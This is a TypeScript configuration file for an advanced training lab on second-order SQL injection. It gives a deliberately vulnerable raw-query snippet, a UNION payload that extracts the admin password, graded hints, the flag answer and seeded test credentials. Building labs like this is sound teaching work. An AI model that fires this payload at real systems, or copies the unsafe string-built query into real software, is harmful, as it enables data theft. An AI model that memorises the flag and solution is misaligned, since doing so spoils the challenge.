import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab4Metadata: LabMetadata = {
  slug: 'sqli-second-order',
  title: 'SQL Injection: Second-Order (Stored) Attack',
  ar_title: 'حقن SQL: الحقن من الدرجة الثانية (المخزَّن)',
  description:
    "The input field is protected. The report generator isn't. Store a malicious payload in your profile, then trigger the vulnerable report query to fire it.",
  ar_description:
    'حقل الإدخال محمي — المدخلات تُحفظ بأمان عبر ORM. لكن مولّد التقارير يستخدم البيانات المخزّنة في raw query. خزّن payload خبيثًا ثم شغّل التقرير لإطلاقه.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'Second-Order SQLi',
    'Stored Payloads',
    'UNION Attack',
    'ORM False Security',
  ],
  xpReward: 400,
  pointsReward: 200,
  duration: 50,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  goal: 'Store a UNION-based SQLi payload in your display name, then trigger the report generator to extract the admin password.',
  scenario: {
    context:
      'NeoHire applicant portal. You update your display name — Prisma ORM handles the insert (parameterized — safe). ' +
      "But when the system generates your 'Application Report', it reads the stored name from DB " +
      'and concatenates it directly into a raw SQL query. The injection fires AFTER storage, not during input. ' +
      'Most security scanners miss this entirely.',
    vulnerableCode:
      '// Step 1 — SAFE: stored via Prisma ORM\n' +
      'await prisma.labGenericUser.update({ data: { email: displayName } });\n\n' +
      '// Step 2 — VULNERABLE: read safely, then injected raw\n' +
      'const name = profile.email;\n' +
      "const query = `SELECT ... WHERE username ILIKE '%${name}%'`;",
    exploitation:
      'Step 1 — POST /lab4/set-name:\n' +
      '  { displayName: "applicant%\' UNION SELECT username, password, role FROM \\"LabGenericUser\\" WHERE role=\'admin\'--" }\n\n' +
      'Step 2 — POST /lab4/generate-report → stored payload fires → admin password returned.',
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        'Try /set-name with a single quote — it saves fine! The INPUT is protected. Now call /generate-report and observe what changes.',
    },
    {
      order: 2,
      xpCost: 25,
      content:
        '/generate-report takes no user input — it reads your stored profile. But it builds a raw ILIKE query using that stored data. Your payload executes THERE.',
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "The report query: ILIKE '%displayName%'. Close with %', append UNION SELECT to extract the admin password column.",
    },
    {
      order: 4,
      xpCost: 60,
      content:
        "Payload: applicant%' UNION SELECT username, password, role FROM \"LabGenericUser\" WHERE role='admin'--\nSave via /set-name, then trigger /generate-report.",
    },
  ],

  flagAnswer: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
  initialState: {
    users: [
      {
        username: 'applicant',
        email: 'pending',
        role: 'applicant',
        password: 'app_temp_pass',
      },
      {
        username: 'hr_review',
        email: 'hr@neohire.io',
        role: 'reviewer',
        password: 'hr_review_pass',
      },
      {
        username: 'hr_admin',
        email: 'admin@neohire.io',
        role: 'admin',
        password: 'FLAG{SECOND_ORDER_SQLI_FIRED}',
      },
    ],
  },
};
